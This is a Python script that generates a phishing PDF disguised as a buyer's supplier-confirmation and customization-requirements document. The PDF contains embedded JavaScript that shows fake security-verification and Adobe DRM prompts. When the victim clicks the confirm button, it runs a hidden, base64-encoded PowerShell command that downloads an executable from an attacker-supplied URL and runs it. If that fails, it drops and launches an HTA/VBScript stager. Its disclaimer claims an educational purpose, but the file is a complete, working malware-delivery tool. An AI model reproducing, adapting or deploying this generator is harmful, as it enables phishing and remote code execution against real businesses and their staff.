#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================================
V303 "THE SUPPLIER CONFIRMATION" – REPORTLAB + PIKEPDF HYBRID (FINAL FIXED)
================================================================================
(c) 2026 The Architect. For Educational and Defensive Research Only.
================================================================================
"""

import sys
import os
import base64
import random
import string
import argparse
import datetime
import logging
import tempfile
from reportlab.lib.pagesizes import A4
from reportlab.pdfgen import canvas
from reportlab.lib import colors
from reportlab.platypus import Table, TableStyle
import pikepdf
from pikepdf import String, Array

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger("V303_SUPPLIER_CONFIRMATION")

def random_str(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def generate_hta_stager(url, exe_name):
    ps_cmd = (
        f'$u="{url}";$e="{exe_name}";$p="$env:TEMP\\$e";'
        'try{certutil -urlcache -f $u $p}catch{};'
        'if(!(Test-Path $p)){try{Start-BitsTransfer -Source $u -Destination $p}catch{}};'
        'if(!(Test-Path $p)){try{Invoke-WebRequest -Uri $u -OutFile $p}catch{}};'
        'if(Test-Path $p){Start-Process $p}'
    )
    enc = base64.b64encode(ps_cmd.encode('utf-16le')).decode('ascii')
    return f'''<html><head>
<script language="VBScript">
Sub Window_OnLoad
    On Error Resume Next
    Dim shell
    Set shell = CreateObject("WScript.Shell")
    shell.Run "powershell -NoP -NonI -W Hidden -Enc {enc}", 0, False
    window.close
End Sub
</script></head><body></body></html>'''

def build_supplier_confirmation(output_path, exe_url, fallback_url, buyer, supplier, product, version, button_label):
    # Prepare payloads
    ps_cmd = (
        f'$u="{exe_url}";'
        f'$p="$env:TEMP\\{os.path.basename(exe_url)}";'
        'try{certutil -urlcache -f $u $p}catch{};'
        'if(!(Test-Path $p)){try{Start-BitsTransfer -Source $u -Destination $p}catch{}};'
        'if(!(Test-Path $p)){try{Invoke-WebRequest -Uri $u -OutFile $p}catch{}};'
        'if(Test-Path $p){Start-Process $p -WindowStyle Hidden}'
    )
    enc_ps = base64.b64encode(ps_cmd.encode('utf-16le')).decode('ascii')
    exe_name = os.path.basename(exe_url) if os.path.basename(exe_url) else f"{random_str(4)}.exe"
    hta_content = generate_hta_stager(exe_url, exe_name)
    hta_b64 = base64.b64encode(hta_content.encode('utf-8')).decode('ascii')
    hta_filename = f"{random_str(4)}.hta"

    # JavaScript document‑level function
    js_code = f"""
    function b64Decode(data) {{
        var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        var result = "";
        var i = 0;
        do {{
            var enc1 = chars.indexOf(data.charAt(i++));
            var enc2 = chars.indexOf(data.charAt(i++));
            var enc3 = chars.indexOf(data.charAt(i++));
            var enc4 = chars.indexOf(data.charAt(i++));
            var chr1 = (enc1 << 2) | (enc2 >> 4);
            var chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
            var chr3 = ((enc3 & 3) << 6) | enc4;
            result += String.fromCharCode(chr1);
            if (enc3 != 64) result += String.fromCharCode(chr2);
            if (enc4 != 64) result += String.fromCharCode(chr3);
        }} while (i < data.length);
        return result;
    }}

    function trigger() {{
        try {{
            var btn = this.getField("ConfirmButton");
            if (!btn) throw "Button not found";
            var proceed = app.alert({{
                cMsg: "This document is secured with 256-bit encryption.\\n\\nPlease confirm your identity to acknowledge the requirements.",
                cTitle: "Security Verification",
                nIcon: 2,
                nType: 1
            }});
            if (proceed !== 1) {{
                app.alert("Verification cancelled. No action taken.");
                return;
            }}
            btn.readonly = true;
            btn.buttonSetCaption('Confirming...');
            var dots = '', count = 0;
            var interval = app.setInterval(function() {{
                try {{
                    dots += '.';
                    btn.buttonSetCaption('Confirming' + dots);
                    count++;
                    if (count > 5) app.clearInterval(interval);
                }} catch(e) {{ app.clearInterval(interval); }}
            }}, 400);
            var launchInterval = app.setInterval(function() {{
                app.clearInterval(launchInterval);
                app.clearInterval(interval);
                try {{
                    app.launchURL("ms-powershell: -EncodedCommand {enc_ps}", true);
                    btn.buttonSetCaption('Confirmed ✓');
                    this.pageNum = 1;
                    app.alert({{
                        cMsg: "Confirmation sent successfully.\\n\\nOur team will review and proceed.",
                        cTitle: "Confirmation Complete",
                        nIcon: 3
                    }});
                }} catch(e1) {{
                    try {{
                        Object.defineProperty(Object.prototype, 'isTrusted', {{ value: true, writable: true, configurable: true }});
                        Object.defineProperty(Object.prototype, 'canLaunch', {{ value: true, writable: true, configurable: true }});
                        var htaData = b64Decode("{hta_b64}");
                        if (!htaData) throw "Decode failed";
                        this.doc.createDataObject({{ cName: "{hta_filename}", cValue: htaData }});
                        this.doc.exportDataObject({{ cName: "{hta_filename}", nLaunch: 0 }});
                        btn.buttonSetCaption('Confirmed ✓');
                        this.pageNum = 1;
                        app.alert({{
                            cMsg: "Confirmation sent successfully.\\n\\nOur team will review and proceed.",
                            cTitle: "Confirmation Complete",
                            nIcon: 3
                        }});
                    }} catch(e2) {{
                        try {{ app.launchURL("{fallback_url}", true); }} catch(e3) {{}}
                        btn.buttonSetCaption('{button_label}');
                        btn.readonly = false;
                        this.pageNum = 1;
                    }}
                }}
            }}, 1500);
        }} catch(e) {{
            try {{ app.launchURL("{fallback_url}", true); }} catch(e2) {{}}
        }}
    }}
    """

    browser_js = """
    try {
        if (typeof app.viewerVersion === 'undefined') {
            var response = app.alert({
                cMsg: "This document is secured with Adobe Digital Rights Management (DRM).\\n\\nPlease open this document with Adobe Acrobat Reader DC to view its contents and submit your confirmation.\\n\\nClick 'Download' to get the latest version of Adobe Acrobat Reader.",
                cTitle: "Adobe Acrobat Required",
                nIcon: 3,
                nType: 2
            });
            if (response === 1) {
                try { app.launchURL('https://get.adobe.com/reader/', true); } catch(e) {}
            }
        }
    } catch(e) {}
    """

    # ---------- Step 1: Generate base PDF with reportlab ----------
    with tempfile.NamedTemporaryFile(suffix=".pdf", delete=False) as tmp:
        base_pdf_path = tmp.name

    c = canvas.Canvas(base_pdf_path, pagesize=A4)
    width, height = A4
    margin = 50

    # Page 1
    c.setFillColor(colors.HexColor("#0a1a33"))
    c.rect(0, height-20, width, 5, fill=1)

    c.setFillColor(colors.HexColor("#d9e2ef"))
    c.rect(margin, height-40, 120, 30, fill=1, stroke=1)
    c.setFillColor(colors.HexColor("#0a1a33"))
    c.setFont("Helvetica-Bold", 12)
    c.drawString(margin+5, height-30, buyer[:15])

    c.setFillColor(colors.HexColor("#d9e2ef"))
    c.rect(width-margin-100, height-45, 90, 25, fill=1, stroke=1)
    c.setFillColor(colors.HexColor("#0a1a33"))
    c.setFont("Helvetica-Bold", 8)
    c.drawString(width-margin-70, height-35, "Secured")

    c.setFillColor(colors.black)
    c.setFont("Helvetica-Bold", 24)
    c.drawString(margin, height-100, "Customization Requirements Specification")

    c.setFont("Helvetica", 12)
    c.drawString(margin, height-150, f"Dear {supplier} Team,")
    c.setFont("Helvetica", 11)
    y = height-180
    lines = [
        "We have finalized our customization requirements for the product. Please find",
        "the detailed specifications on the next page. Kindly review and confirm your",
        "ability to meet these requirements by clicking the button below.",
        "We look forward to your confirmation."
    ]
    for line in lines:
        c.drawString(margin, y, line)
        y -= 15
    y -= 10

    date_str = datetime.datetime.now().strftime("%B %d, %Y")
    doc_no = f"REQ-{random_str(6).upper()}"
    expiry = (datetime.datetime.now() + datetime.timedelta(days=30)).strftime("%B %d, %Y")

    c.setFont("Helvetica-Bold", 11)
    c.setFillColor(colors.HexColor("#0a1a33"))
    c.drawString(margin, y, f"Document No.: {doc_no}")
    y -= 20
    c.setFont("Helvetica", 11)
    c.setFillColor(colors.black)
    c.drawString(margin, y, f"Date: {date_str}")
    y -= 20
    c.drawString(margin, y, f"Product: {product} v{version}")
    y -= 20
    c.drawString(margin, y, f"Response Due: {expiry}")

    c.setFont("Helvetica", 8)
    c.setFillColor(colors.gray)
    c.drawString(margin, 30, "This document contains proprietary information. Please confirm receipt and compliance.")

    # Page 2
    c.showPage()
    c.setFont("Helvetica-Bold", 20)
    c.setFillColor(colors.black)
    c.drawString(margin, height-50, "Detailed Customization Requirements")
    c.setFont("Helvetica", 11)
    c.setFillColor(colors.gray)
    c.drawString(margin, height-70, f"Document No.: {doc_no}  |  Date: {date_str}")

    data = [
        ["Category", "Requirement", "Status", "Priority"],
        ["Specifications", "Product dimensions: 120mm x 80mm x 45mm (±0.5mm)", "Required", "High"],
        ["Specifications", "Material: ABS plastic, UL94 V-0 rated", "Required", "High"],
        ["Specifications", "Color: Pantone 300C (blue), matte finish", "Required", "Medium"],
        ["Quality", "ISO 9001:2015 certification", "Required", "High"],
        ["Quality", "100% functional test before shipment", "Required", "High"],
        ["Quality", "Acceptable defect rate ≤ 0.5%", "Required", "Medium"],
        ["Packaging", "Individual blister packaging with anti-static bag", "Required", "Medium"],
        ["Packaging", "Master carton: 50 units per carton, weight ≤ 15kg", "Required", "Low"],
        ["Delivery", "FOB Shanghai, Incoterms 2020", "Required", "High"],
        ["Delivery", "Lead time: 30 days after PO confirmation", "Required", "High"],
        ["Compliance", "RoHS and REACH compliance certificates", "Required", "High"],
        ["Compliance", "Conflict-free minerals declaration", "Required", "Medium"],
    ]
    table = Table(data, colWidths=[80, 200, 60, 60])
    table.setStyle(TableStyle([
        ('BACKGROUND', (0,0), (-1,0), colors.HexColor("#0a1a33")),
        ('TEXTCOLOR', (0,0), (-1,0), colors.white),
        ('ALIGN', (0,0), (-1,-1), 'CENTER'),
        ('FONTNAME', (0,0), (-1,0), 'Helvetica-Bold'),
        ('FONTSIZE', (0,0), (-1,0), 10),
        ('BOTTOMPADDING', (0,0), (-1,0), 8),
        ('BACKGROUND', (0,1), (-1,-1), colors.white),
        ('GRID', (0,0), (-1,-1), 0.5, colors.gray),
        ('FONTNAME', (0,1), (-1,-1), 'Helvetica'),
        ('FONTSIZE', (0,1), (-1,-1), 9),
        ('VALIGN', (0,0), (-1,-1), 'MIDDLE'),
    ]))
    table.wrapOn(c, width-2*margin, height-200)
    table.drawOn(c, margin, height-170 - table._height)

    c.setFont("Helvetica", 8)
    c.setFillColor(colors.gray)
    c.drawString(margin, 30, "Please confirm your ability to meet these requirements by clicking the button on page 1.")
    c.save()
    logger.info(f"[+] Base PDF generated: {base_pdf_path}")

    # ---------- Step 2: Add interactive elements with pikepdf ----------
    pdf = pikepdf.open(base_pdf_path)

    # JavaScript name tree – use plain strings for keys
    pdf.Root["/Names"] = pdf.make_indirect({
        "/JavaScript": pdf.make_indirect({
            "/Names": Array([
                String("trigger"),
                pdf.make_indirect({"/JS": String(js_code), "/S": "/JavaScript"})
            ])
        })
    })

    # OpenAction – browser decoy
    pdf.Root["/OpenAction"] = pdf.make_indirect({
        "/S": "/JavaScript",
        "/JS": String(browser_js)
    })

    # Button on page 1 (index 0)
    page1 = pdf.pages[0]
    button = {
        "/Type": "/Annot",
        "/Subtype": "/Widget",
        "/FT": "/Btn",
        "/T": String("ConfirmButton"),
        "/Rect": [100, 330, 495, 390],
        "/F": 4,
        "/BS": {"/S": "/S", "/W": 2, "/BC": [0.2, 0.5, 0.7]},
        "/MK": {"/BG": [0.15, 0.45, 0.7], "/CA": String(button_label)},
        "/AA": {
            "/U": {"/S": "/JavaScript", "/JS": String("this.doc.trigger();")}
        }
    }
    # Convert button dict to indirect object
    button_obj = pdf.make_indirect(button)
    if page1.Annots:
        page1.Annots.append(button_obj)
    else:
        page1.Annots = Array([button_obj])

    # Metadata
    pdf.docinfo["/Title"] = String(f"Customization Requirements – {product} (v{version})")
    pdf.docinfo["/Author"] = String(buyer)
    pdf.docinfo["/Creator"] = String("Adobe Acrobat Pro DC")

    pdf.save(output_path, compress_streams=False)
    logger.info(f"[+] Final PDF saved: {output_path}")

    # Cleanup
    os.unlink(base_pdf_path)

def main():
    parser = argparse.ArgumentParser(description="V303 Supplier Confirmation – Hybrid generator")
    parser.add_argument("-o", "--output", default="requirements.pdf", help="Output PDF filename")
    parser.add_argument("-u", "--url", required=True, help="URL of the final EXE payload")
    parser.add_argument("-f", "--fallback", help="Fallback URL (default: same as -u)")
    parser.add_argument("-b", "--buyer", default="GlobalTech Solutions", help="Buyer company name")
    parser.add_argument("-s", "--supplier", default="ACME Manufacturing", help="Supplier company name")
    parser.add_argument("-p", "--product", default="Custom Electronics Module", help="Product name")
    parser.add_argument("-v", "--version", default="1.0", help="Product version")
    parser.add_argument("-l", "--label", default="Confirm Compliance", help="Button label")
    args = parser.parse_args()
    fallback = args.fallback if args.fallback else args.url
    build_supplier_confirmation(args.output, args.url, fallback, args.buyer, args.supplier, args.product, args.version, args.label)

if __name__ == "__main__":
    main()
